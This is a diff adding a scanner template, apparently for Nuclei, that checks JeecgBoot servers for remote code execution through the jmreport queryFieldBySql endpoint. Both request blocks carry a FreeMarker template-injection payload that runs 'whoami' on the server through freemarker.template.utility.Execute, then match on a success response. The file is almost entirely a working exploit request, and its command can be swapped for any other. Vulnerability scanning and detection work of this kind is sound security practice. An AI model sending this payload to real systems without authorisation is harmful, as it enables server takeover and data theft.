@@ -1,0 +1,54 @@
+id: JeecgBoot-queryFieldBySql-rce
+
+info:
+  name: JeecgBoot-queryFieldBySql-rce
+  author: M9
+  severity: critical
+  tags: JeecgBoot,rce
+
+http:
+  - raw:
+      - |+
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 98
+
+        {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |+
+        POST /jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 98
+
+        {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: status
+        status:
+          - 200
